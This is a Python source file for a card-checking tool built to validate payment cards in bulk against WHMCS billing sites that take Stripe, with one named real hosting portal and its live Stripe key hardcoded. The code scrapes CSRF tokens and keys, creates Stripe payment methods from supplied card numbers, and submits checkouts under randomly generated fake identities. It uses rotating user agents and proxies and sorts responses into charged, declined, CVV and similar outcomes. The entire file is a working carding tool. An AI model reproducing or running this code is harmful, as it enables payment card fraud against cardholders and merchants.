"""
WHMCS + Stripe Checker
Full workflow: Load WHMCS order page → Add product to cart → Create Stripe PaymentMethod → Submit checkout
Gateway: Stripe via WHMCS billing panel (Lagom OneStepOrder)

Supports any WHMCS site with Stripe payment gateway.
"""

import asyncio
import aiohttp
import random
import string
import re
import json
import time
from fake_useragent import UserAgent
from urllib.parse import urlencode, urlparse


class WHMCSStripeResultClassifier:
    CHARGED_KEYWORDS = [
        'order confirmation', 'order complete', 'thank you for your order',
        'payment received', 'invoice paid', 'order has been placed',
        'successfully processed', 'payment successful',
    ]
    
    DECLINED_KEYWORDS = [
        'remote transaction failure', 'card was declined', 'transaction declined',
        'payment failed', 'unable to process', 'do not honor', 'insufficient funds',
        'card declined', 'declined', 'not authorized', 'transaction not allowed',
        'pickup card', 'lost card', 'stolen card', 'expired card',
        'invalid card', 'security code', 'incorrect cvc', 'incorrect_cvc',
        'card_declined', 'generic_decline', 'fraudulent', 'processing_error',
        'incorrect_number', 'invalid_expiry', 'expired_card', 'incorrect_zip',
    ]
    
    CCN_KEYWORDS = [
        'incorrect_number', 'invalid card number', 'card number is invalid',
        'invalid_number', 'number is not a valid',
    ]

    CVV_KEYWORDS = [
        'incorrect_cvc', 'security code is incorrect', 'cvc is incorrect',
        'invalid cvc', 'invalid_cvc', 'incorrect cvv',
    ]

    EXPIRED_KEYWORDS = [
        'expired_card', 'card has expired', 'expiration date is invalid',
        'invalid_expiry', 'exp_month', 'exp_year',
    ]

    RISK_KEYWORDS = [
        'high risk', 'fraud', 'fraudulent', 'risk', 'blocked',
        'suspected fraud', 'stripe radar',
    ]

    THREEDS_KEYWORDS = [
        'requires_action', 'authentication_required', '3d secure',
        'requires_source_action', 'payment_intent_authentication',
        'sca', 'strong customer authentication',
    ]

    RATE_LIMIT_KEYWORDS = [
        'rate limit', 'too many requests', 'try again later',
        'temporarily unavailable', 'throttl',
    ]

    MAINTENANCE_KEYWORDS = [
        'maintenance', 'under construction', 'temporarily unavailable',
        'service unavailable', 'coming soon', '503',
    ]

    @staticmethod
    def classify(response_text, status_code=200, stripe_error=None):
        text = (response_text or '').lower().strip()

        if stripe_error:
            err_code = stripe_error.get('code', '')
            err_msg = stripe_error.get('message', '').lower()
            err_decline = stripe_error.get('decline_code', '')
            
            if err_code == 'incorrect_number' or 'invalid card number' in err_msg:
                return 'CCN', f'Invalid Card Number | {err_msg}'
            if err_code == 'incorrect_cvc' or 'cvc' in err_msg.lower():
                return 'CVV', f'Incorrect CVV/CVC | {err_msg}'
            if err_code == 'expired_card' or 'expired' in err_msg:
                return 'EXPIRED', f'Card Expired | {err_msg}'
            if err_code == 'card_declined':
                return 'DECLINED', f'{err_decline or "Generic Decline"} | {err_msg}'
            if err_code == 'processing_error':
                return 'ERROR', f'Processing Error | {err_msg}'
            if 'rate_limit' in err_code or 'rate limit' in err_msg:
                return 'RATE_LIMIT', f'Rate Limited | {err_msg}'
            if err_code == 'authentication_required' or 'authentication' in err_msg:
                return '3DS', f'3D Secure Required | {err_msg}'
            if 'test card' in err_msg or 'test mode' in err_msg:
                return 'ERROR', f'Test card rejected | {err_msg}'
            return 'DECLINED', f'{err_code or "error"} | {err_msg}'

        if status_code and status_code >= 500:
            for kw in WHMCSStripeResultClassifier.MAINTENANCE_KEYWORDS:
                if kw in text:
                    return 'ERROR', 'Site under maintenance - retry later'
            return 'ERROR', f'Server error {status_code}'

        for kw in WHMCSStripeResultClassifier.CCN_KEYWORDS:
            if kw in text:
                return 'CCN', f'Invalid Card Number | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.CVV_KEYWORDS:
            if kw in text:
                return 'CVV', f'Incorrect CVV | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.EXPIRED_KEYWORDS:
            if kw in text:
                return 'EXPIRED', f'Card Expired | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.THREEDS_KEYWORDS:
            if kw in text:
                return '3DS', f'3D Secure Required | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.RISK_KEYWORDS:
            if kw in text:
                return 'RISK', f'Flagged High Risk | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.RATE_LIMIT_KEYWORDS:
            if kw in text:
                return 'RATE_LIMIT', f'Rate Limited | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.CHARGED_KEYWORDS:
            if kw in text:
                return 'CHARGED', f'Payment Accepted | {text[:80]}'
        for kw in WHMCSStripeResultClassifier.DECLINED_KEYWORDS:
            if kw in text:
                return 'DECLINED', f'{text[:100]}'

        return 'UNKNOWN', f'Unclassified response | {text[:100]}'


class WHMCSStripeChecker:
    """
    Full WHMCS + Stripe checkout checker.
    
    Flow:
    1. Load WHMCS order page → get session + CSRF token
    2. Add product to cart via cart.php?a=add&pid=X
    3. Create Stripe PaymentMethod via Stripe API (pk_live key)
    4. Submit checkout to /stripe/payment/intent with billing + PM ID
    5. Parse response for decline/approval
    """

    SITE_NAME = "WHMCS"
    SITE_URL = ""
    STRIPE_PK = ""
    DEFAULT_PID = 1
    BILLING_CYCLE = "monthly"

    def __init__(self):
        self.ua = UserAgent(browsers=['chrome'], os=['windows'], platforms=['pc'])

    def _random_email(self):
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        num = random.randint(10, 99)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        return f"{user}{num}@{random.choice(domains)}"

    def _random_name(self):
        first_names = [
            'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
            'Joseph', 'Thomas', 'Christopher', 'Daniel', 'Matthew', 'Anthony',
            'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth', 'Kevin',
            'Brian', 'George', 'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey',
            'Ryan', 'Jacob', 'Nicholas', 'Gary', 'Eric', 'Jonathan', 'Stephen',
        ]
        last_names = [
            'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
            'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
            'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
            'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark',
            'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King',
        ]
        return random.choice(first_names), random.choice(last_names)

    def _random_address(self):
        streets = [
            '123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm St',
            '654 Maple Dr', '987 Cedar Ln', '147 Birch Way', '258 Walnut Ct',
            '369 Spruce Pl', '741 Willow St', '852 Ash Blvd', '963 Cherry Ln',
        ]
        cities = [
            ('New York', 'New York', '10001'),
            ('Los Angeles', 'California', '90001'),
            ('Chicago', 'Illinois', '60601'),
            ('Houston', 'Texas', '77001'),
            ('Phoenix', 'Arizona', '85001'),
            ('Philadelphia', 'Pennsylvania', '19101'),
            ('San Antonio', 'Texas', '78201'),
            ('San Diego', 'California', '92101'),
            ('Dallas', 'Texas', '75201'),
            ('Austin', 'Texas', '73301'),
            ('Jacksonville', 'Florida', '32099'),
            ('Columbus', 'Ohio', '43085'),
            ('Charlotte', 'North Carolina', '28201'),
            ('Indianapolis', 'Indiana', '46201'),
            ('Denver', 'Colorado', '80201'),
            ('Seattle', 'Washington', '98101'),
            ('Nashville', 'Tennessee', '37201'),
            ('Portland', 'Oregon', '97201'),
            ('Atlanta', 'Georgia', '30301'),
            ('Miami', 'Florida', '33101'),
        ]
        street = random.choice(streets)
        city, state, zipcode = random.choice(cities)
        return street, city, state, zipcode

    def _random_phone(self):
        area = random.choice(['212', '310', '312', '713', '602', '215', '210',
                              '619', '214', '512', '904', '614', '704', '317',
                              '303', '206', '615', '503', '404', '305'])
        num = f"+1.{area}{random.randint(2000000, 9999999)}"
        return num

    def _random_password(self):
        chars = string.ascii_letters + string.digits + '!@#$%'
        return ''.join(random.choices(chars, k=16))

    def _get_headers(self, referer=None):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': referer or self.SITE_URL,
        }

    def _get_ajax_headers(self, referer=None):
        return {
            'User-Agent': self.ua.random,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/plain, */*',
            'Referer': referer or self.SITE_URL,
        }

    async def check_card(self, cc, mes, ano, cvv=None, proxy=None, skip_cvv=False):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        mode = " [NO-CVV MODE]" if skip_cvv else ""
        print(f"[{self.SITE_NAME}]{mode} Checking: {card_display}", flush=True)

        connector = None
        if proxy:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            except Exception as e:
                print(f"[{self.SITE_NAME}] Proxy error: {e}", flush=True)

        timeout = aiohttp.ClientTimeout(total=45)
        jar = aiohttp.CookieJar(unsafe=True)

        try:
            async with aiohttp.ClientSession(
                timeout=timeout,
                cookie_jar=jar,
                connector=connector,
                headers=self._get_headers()
            ) as session:

                # ─── STEP 1: Load order page + get session/CSRF ───
                print(f"[{self.SITE_NAME}] Loading order page...", flush=True)
                
                parsed = urlparse(self.SITE_URL)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"

                async with session.get(self.SITE_URL, allow_redirects=True) as resp:
                    if resp.status >= 500:
                        return 'ERROR', 'Site under maintenance - retry later'
                    html = await resp.text()
                    order_page_url = str(resp.url)

                csrf_match = re.search(r"csrfToken\s*=\s*'([^']+)'", html)
                csrf_token = csrf_match.group(1) if csrf_match else ''

                if not csrf_token:
                    csrf_match = re.search(r'name="token"\s+value="([^"]+)"', html)
                    csrf_token = csrf_match.group(1) if csrf_match else ''

                if not csrf_token:
                    return 'ERROR', 'CSRF token not found on page'

                pk_match = re.search(r"Stripe\s*\(\s*'(pk_live_[^']+)'", html)
                stripe_pk = pk_match.group(1) if pk_match else self.STRIPE_PK

                if not stripe_pk:
                    pk_match2 = re.search(r'(pk_live_[A-Za-z0-9]+)', html)
                    stripe_pk = pk_match2.group(1) if pk_match2 else ''

                if not stripe_pk:
                    return 'ERROR', 'Stripe PK key not found on page'

                print(f"[{self.SITE_NAME}] Got CSRF + Stripe PK", flush=True)

                # ─── STEP 2: Add product to cart ───
                print(f"[{self.SITE_NAME}] Adding product to cart (PID={self.DEFAULT_PID})...", flush=True)

                add_url = f"{base_domain}/cart.php?a=add&pid={self.DEFAULT_PID}&billingcycle={self.BILLING_CYCLE}"
                async with session.get(add_url, allow_redirects=True) as resp:
                    cart_html = await resp.text()
                    cart_url = str(resp.url)

                csrf_match2 = re.search(r"csrfToken\s*=\s*'([^']+)'", cart_html)
                if csrf_match2:
                    csrf_token = csrf_match2.group(1)

                print(f"[{self.SITE_NAME}] Product added to cart", flush=True)

                # ─── STEP 3: Create Stripe PaymentMethod ───
                print(f"[{self.SITE_NAME}] Creating Stripe PaymentMethod...", flush=True)

                exp_month = mes.lstrip('0') if mes else mes
                exp_year = ano
                if len(exp_year) == 2:
                    exp_year = f"20{exp_year}"

                stripe_data = {
                    'type': 'card',
                    'card[number]': cc,
                    'card[exp_month]': exp_month,
                    'card[exp_year]': exp_year,
                    'key': stripe_pk,
                }
                if cvv and not skip_cvv:
                    stripe_data['card[cvc]'] = cvv
                    print(f"[{self.SITE_NAME}] Sending CVV to Stripe", flush=True)
                else:
                    print(f"[{self.SITE_NAME}] CVV intercepted - stripped from Stripe request", flush=True)

                async with session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    data=stripe_data,
                    headers={'User-Agent': self.ua.random}
                ) as resp:
                    stripe_resp = await resp.json()

                if 'error' in stripe_resp:
                    err = stripe_resp['error']
                    result_type, result_msg = WHMCSStripeResultClassifier.classify(
                        '', stripe_error=err
                    )
                    card_info = f"{cc[-4:]}"
                    print(f"[{self.SITE_NAME}] Stripe error: {err.get('message', '')}", flush=True)
                    return result_type, f"{result_msg} | ...{card_info}"

                pm_id = stripe_resp.get('id', '')
                card_data = stripe_resp.get('card', {})
                brand = card_data.get('brand', '?').upper()
                funding = card_data.get('funding', '?')
                country = card_data.get('country', '?')
                last4 = card_data.get('last4', cc[-4:])
                checks = card_data.get('checks', {})

                bin_line = f"{brand} {funding} {country} ...{last4}"
                print(f"[{self.SITE_NAME}] PM created: {pm_id[:25]}... | {bin_line}", flush=True)

                # ─── BIN info display ───
                try:
                    from bin_info import bin_block_from_braintree
                    bin_block = bin_block_from_braintree({
                        'details': {
                            'cardType': brand,
                            'bin': cc[:6],
                        },
                        'binData': {
                            'issuingBank': card_data.get('brand', ''),
                            'countryOfIssuance': country,
                            'productId': funding,
                            'prepaid': 'Yes' if card_data.get('funding') == 'prepaid' else 'No',
                        }
                    })
                except Exception:
                    pass

                # ─── STEP 4: Submit checkout ───
                print(f"[{self.SITE_NAME}] Submitting checkout...", flush=True)

                first_name, last_name = self._random_name()
                email = self._random_email()
                street, city, state, zipcode = self._random_address()
                phone = self._random_phone()
                password = self._random_password()

                checkout_data = {
                    'custtype': 'new',
                    'firstname': first_name,
                    'lastname': last_name,
                    'companyname': '',
                    'email': email,
                    'address1': street,
                    'address2': '',
                    'city': city,
                    'state': state,
                    'postcode': zipcode,
                    'country': 'US',
                    'phonenumber': phone,
                    'password': password,
                    'password2': password,
                    'paymentmethod': 'stripe',
                    'payment_method_id': pm_id,
                    'token': csrf_token,
                    'submit': 'true',
                    'accepttos': 'on',
                    'tos': 'on',
                }

                intent_url = f"{base_domain}/stripe/payment/intent"

                async with session.post(
                    intent_url,
                    data=urlencode(checkout_data),
                    headers=self._get_ajax_headers(referer=cart_url)
                ) as resp:
                    resp_status = resp.status
                    try:
                        result = await resp.json()
                    except Exception:
                        result_text = await resp.text()
                        result = {'validation_feedback': result_text}

                print(f"[{self.SITE_NAME}] Response: {resp_status}", flush=True)

                # ─── STEP 5: Parse response ───
                
                if resp_status >= 500:
                    return 'ERROR', 'Site under maintenance - retry later'

                success = result.get('success', False)
                token = result.get('token', '')
                feedback = result.get('validation_feedback', '')
                requires_payment = result.get('requires_payment', False)

                if success and token:
                    return 'CHARGED', f'Payment Accepted ✅ | {bin_line}'

                if requires_payment or (token and 'pi_' in token):
                    return '3DS', f'3D Secure / SCA Required | {bin_line}'

                if token and ('_secret_' in token or 'seti_' in token):
                    return 'CHARGED', f'SetupIntent OK (card verified) | {bin_line}'

                if feedback:
                    feedback_lower = feedback.lower()
                    feedback_clean = re.sub(r'<[^>]+>', '', feedback).strip()

                    if 'remote transaction failure' in feedback_lower:
                        return 'DECLINED', f'Transaction Declined | {bin_line}'
                    
                    if 'already registered' in feedback_lower or 'already exists' in feedback_lower:
                        return 'ERROR', f'Email conflict (retry with different identity) | {bin_line}'

                    if 'captcha' in feedback_lower or 'recaptcha' in feedback_lower:
                        return 'ERROR', f'CAPTCHA required | {bin_line}'

                    result_type, result_msg = WHMCSStripeResultClassifier.classify(feedback_lower)
                    return result_type, f'{result_msg} | {bin_line}'

                if success:
                    return 'CHARGED', f'Order placed | {bin_line}'

                return 'UNKNOWN', f'Unclassified: {json.dumps(result)[:80]} | {bin_line}'

        except asyncio.TimeoutError:
            return 'ERROR', 'Request timed out'
        except aiohttp.ClientError as e:
            return 'ERROR', f'Connection error: {str(e)[:60]}'
        except Exception as e:
            print(f"[{self.SITE_NAME}] Exception: {e}", flush=True)
            return 'ERROR', f'Exception: {str(e)[:60]}'


class ChartVPSChecker(WHMCSStripeChecker):
    SITE_NAME = "ChartVPS"
    SITE_URL = "https://portal.chartvps.com/order.php?m=OneStepOrder&gid=vpsplus"
    STRIPE_PK = "pk_live_CumexPm8VytoTYzvq2PooHnk006YjprRgo"
    DEFAULT_PID = 1
    BILLING_CYCLE = "monthly"


if __name__ == '__main__':
    import sys

    async def main():
        if len(sys.argv) < 2:
            print("Usage: python whmcs_stripe_checker.py CC|MM|YY|CVV")
            print("Example: python whmcs_stripe_checker.py 4111111111111111|12|2028|123")
            return

        card_input = sys.argv[1]
        parts = card_input.split('|')
        if len(parts) != 4:
            print("Invalid format. Use: CC|MM|YY|CVV")
            return

        cc, mm, yy, cvv = parts

        checker = ChartVPSChecker()
        result_type, result_msg = await checker.check_card(cc, mm, yy, cvv)
        print(f"\n{'='*60}")
        print(f"Result: {result_type}")
        print(f"Details: {result_msg}")

    asyncio.run(main())
